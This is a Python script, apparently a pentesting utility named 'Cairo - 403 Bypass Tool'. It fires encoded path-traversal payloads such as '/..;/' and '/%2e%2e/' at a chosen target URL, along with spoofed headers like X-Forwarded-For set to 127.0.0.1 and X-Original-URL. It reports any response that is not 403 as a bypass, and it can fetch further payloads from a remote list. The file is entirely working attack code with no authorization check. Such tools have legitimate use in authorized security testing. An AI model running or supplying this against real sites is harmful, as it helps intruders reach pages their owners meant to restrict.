#!/usr/bin/env python3

import requests
from urllib.parse import urljoin

# Tool details
tool_name = "Cairo - 403 Bypass Tool"
author_contact = "shaheeryasirx1@gmail.com"
version = "1.1"
banner = f"""
███████╗ █████╗ ██╗██████╗  ██████╗ 
██╔════╝██╔══██╗██║██╔══██╗██╔═══██╗
█████╗  ███████║██║██████╔╝██║   ██║
██╔══╝  ██╔══██║██║██╔═══╝ ██║   ██║
███████╗██║  ██║██║██║     ╚██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝
                Version: {version}
                Author: {author_contact}
"""

# Default local payloads (fallback)
local_payloads = [
    "/",
    "/.",
    "/..;/",
    "/%2e/",
    "/%2e%2e/",
    "/%3b/",
    "/%2f/",
    "/?anything",
    "/index.html",
    "/index.php",
]

# Headers for bypass attempts
headers = {
    "X-Original-URL": None,
    "X-Rewrite-URL": None,
    "Referer": None,
    "User-Agent": "Cairo-403-Bypass",
    "X-Forwarded-For": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
}

# Function to fetch external payloads
def fetch_payloads(url):
    print("[*] Fetching external payload list...")
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"[+] Successfully fetched payloads from {url}")
            return response.text.splitlines()
        else:
            print(f"[!] Failed to fetch payloads. HTTP Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error fetching payloads: {e}")
    return []  # Return an empty list if the fetch fails

# Function to attempt bypass
def bypass_403(target_url, payloads):
    print(banner)
    print(f"[*] Starting 403 bypass tests on target: {target_url}\n")
    for payload in payloads:
        url_to_test = urljoin(target_url, payload)
        print(f"[+] Testing URL: {url_to_test}")
        response = requests.get(url_to_test, headers=headers, allow_redirects=False)
        if response.status_code != 403:
            print(f"[!] Potential bypass: {url_to_test} (Status: {response.status_code})")
        else:
            print(f"[-] Blocked: {url_to_test} (Status: {response.status_code})")

    print("\n[*] Testing completed.")

# Main program execution
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="403 Bypass Testing Tool - Cairo")
    parser.add_argument("target", help="Target URL to test (e.g., https://example.com/)")
    parser.add_argument(
        "--payloads-url",
        help="URL to fetch external payloads (optional)",
        default=None,
    )
    args = parser.parse_args()

    # Fetch payloads
    external_payloads = []
    if args.payloads_url:
        external_payloads = fetch_payloads(args.payloads_url)
    
    # Combine external payloads with local payloads as fallback
    payloads = external_payloads or local_payloads

    # Run bypass test
    bypass_403(args.target, payloads)
